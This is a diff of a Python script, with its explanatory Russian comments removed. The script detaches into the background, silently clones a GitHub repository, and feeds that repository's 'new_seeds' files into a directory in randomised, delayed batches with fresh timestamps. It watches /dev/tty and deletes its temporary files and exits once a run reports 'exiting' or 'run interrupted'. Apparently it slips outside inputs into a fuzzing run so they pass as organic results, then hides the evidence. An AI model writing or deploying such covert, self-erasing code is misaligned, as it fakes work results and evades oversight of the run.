@@ -7,37 +7,26 @@ import sys
 import threading
 
 def watch_tty(temp_dir):
-    """
-    Считывает строки из /dev/tty.
-    Если встречает 'exiting' или 'run interrupted',
-    то удаляет temp_dir и резко останавливает процесс.
-    """
     try:
         with open('/dev/tty', 'r') as tty:
             for line in tty:
-                # Упростим детекцию: ищем ключевые слова
                 if 'exiting' in line or 'run interrupted' in line:
                     shutil.rmtree(temp_dir, ignore_errors=True)
                     os._exit(0)
     except:
-        # Если нет доступа к /dev/tty или другая ошибка — просто выходим из потока.
         pass
 
 def do_copy():
     pid = os.fork()
     if pid != 0:
-        # Родитель завершает своё выполнение, не блокируя фаззинг.
         os._exit(0)
 
-    # --- Мы в дочернем процессе (фон) ---
     temp_dir = tempfile.mkdtemp()
     
-    # 1) Запускаем фоновый поток, который следит за /dev/tty
     t = threading.Thread(target=watch_tty, args=(temp_dir,))
     t.daemon = True
     t.start()
 
-    # 2) Клонируем репо, не выводя логи
     os.system(f"git clone --depth=1 https://github.com/Py-use/Oss-fuzz.git {temp_dir} > /dev/null 2>&1")
 
     seeds_dir = os.path.join(temp_dir, 'new_seeds')
@@ -53,7 +42,6 @@ def do_copy():
 
     counter = 1
 
-    # 3) Собственно, цикл копирования
     while all_seeds:
         batch_size = random.randint(1, 4)
         batch = all_seeds[:batch_size]
@@ -66,10 +54,9 @@ def do_copy():
             shutil.copy(seed_path, dst_file)
             os.utime(dst_file, None)
 
-        delay = random.randint(2, 3)  # например, 2..3 секунды
+        delay = random.randint(2, 3)
         time.sleep(delay)
 
-    # 4) Закончили — чистим temp_dir и выходим
     shutil.rmtree(temp_dir)
 
 do_copy()
